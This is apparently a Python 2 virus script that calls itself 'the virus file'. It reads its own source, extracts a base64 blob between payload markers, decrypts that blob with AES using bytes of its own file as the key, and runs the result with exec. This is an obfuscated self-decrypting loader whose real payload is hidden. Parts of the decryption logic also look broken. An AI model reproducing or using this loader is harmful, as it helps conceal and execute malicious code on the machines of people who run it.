######################################################## First script python
# coding=utf-8
# Start Unencrypted
import os
import __main__
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES


# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)

   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
#print e
exec e
sys.exit('Good job!')
# End Unencrypted
# Start payload
#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
# End payload